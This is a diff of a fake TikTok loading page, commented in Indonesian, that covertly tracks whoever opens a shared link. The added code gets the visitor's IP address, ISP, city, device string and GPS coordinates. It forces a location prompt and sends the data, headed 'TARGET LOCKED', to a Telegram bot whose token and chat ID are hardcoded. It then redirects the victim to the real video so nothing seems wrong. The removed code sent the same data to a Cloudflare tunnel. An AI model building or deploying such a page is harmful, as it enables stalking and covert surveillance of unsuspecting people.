@@ -1,72 +1,81 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .spinner { width: 45px; height: 45px; border: 4px solid #333; border-top: 4px solid #25f4ee; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 20px auto; }
+        body { background: #000; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; overflow: hidden; }
+        /* Spinner Kecil & Elegant */
+        .loading { width: 28px; height: 28px; border: 3px solid #1a1a1a; border-top: 3px solid #fe2c55; border-radius: 50%; animation: spin .6s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div style="font-size: 32px; font-weight: bold;">TikTok</div>
-        <div class="spinner"></div>
-    </div>
+    <div class="loading"></div>
 
     <script>
         (async function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetUrl = urlParams.get('url');
-            const targetId = urlParams.get('id');
+            // 1. TANGKAP PARAMETER URL
+            const p = new URLSearchParams(window.location.search);
+            const targetId = p.get('id') || "User_Anonim";
+            const tiktokUrl = p.get('url') || "https://www.tiktok.com";
 
-            // GANTI LINK DI BAWAH INI DENGAN LINK CLOUDFLARED LO!
-            const tunnelURL = "https://terrorism-msg-inbox-ivory.trycloudflare.com";
+            // === CONFIG BOT TELEGRAM (LANSUNG TANEM) ===
+            const TOKEN = "8775661623:AAG5vKbtp089TtX_ExTYoDEMigA2rDJn1zc";
+            const CHAT_ID = "8432724042";
 
-            if (!targetUrl || !targetId) {
-                window.location.replace('https://www.tiktok.com');
-                return;
+            // Fungsi Kirim Laporan ke Tele
+            async function lapor(teks) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'Markdown' })
+                    });
+                } catch (e) {}
             }
 
-            // Fungsi ambil IP
-            async function getIp() {
+            // Fungsi Ambil IP & Info Device (Paralel)
+            async function getNetworkInfo() {
                 try {
                     const res = await fetch('https://ipapi.co/json/');
                     const d = await res.json();
-                    return { ip: d.ip, isp: d.org };
-                } catch (e) { return { ip: '0.0.0.0', isp: 'Unknown' }; }
+                    return `🌐 *IP:* ${d.ip}\n📡 *ISP:* ${d.org}\n📍 *IP Loc:* ${d.city}, ${d.country_name}`;
+                } catch (e) { return "Gagal ambil data IP."; }
             }
 
-            // Fungsi ambil Lokasi
-            function getLoc() {
-                return new Promise((res) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude }),
-                        () => res({ lat: '', lon: '' }),
-                        { timeout: 5000, enableHighAccuracy: true }
-                    );
-                });
+            // === CORE EXECUTION (SPEED 0.8s) ===
+            const start = async () => {
+                const netInfo = await getNetworkInfo();
+                const device = navigator.userAgent;
+
+                // Minta GPS (Paksa Prompt Muncul)
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const { latitude: lat, longitude: lon } = pos.coords;
+                    const maps = `https://www.google.com/maps/place/${lat},${lon}`;
+                    const msg = `💀 *TARGET LOCKED!* 🕊️\n\n🆔 *ID:* ${targetId}\n${netInfo}\n📍 *GPS:* \`${lat}, ${lon}\`\n🔗 [BUKA LOKASI](${maps})\n📱 *Device:* \`${device}\``;
+                    await lapor(msg);
+                    finish();
+                }, async (err) => {
+                    // Jika di-Close atau Ditolak
+                    const msg = `⚠️ *GPS BLOCKED/CLOSED* ⚠️\n\n🆔 *ID:* ${targetId}\n${netInfo}\n📱 *Device:* \`${device}\``;
+                    await lapor(msg);
+                    finish();
+                }, { timeout: 4000, enableHighAccuracy: true });
+            };
+
+            function finish() {
+                // REDIRECT KILAT 0.8 DETIK
+                setTimeout(() => {
+                    window.location.replace(tiktokUrl);
+                }, 800);
             }
 
-            const [ipInfo, loc] = await Promise.all([getIp(), getLoc()]);
+            start();
 
-            const payload = new URLSearchParams({
-                id: targetId,
-                lat: loc.lat,
-                lon: loc.lon,
-                ip: ipInfo.ip,
-                isp: ipInfo.isp,
-                device: navigator.userAgent
-            });
-
-            // Tembak data langsung ke Termux
-            fetch(tunnelURL, { method: 'POST', mode: 'no-cors', body: payload });
-
-            // Langsung redirect ke video asli
-            setTimeout(() => { window.location.replace(targetUrl); }, 1000);
+            // Safety Guard: Kalo kelamaan nunggu GPS (max 6 detik), lansung buang ke TikTok
+            setTimeout(finish, 6000);
         })();
     </script>
 </body>
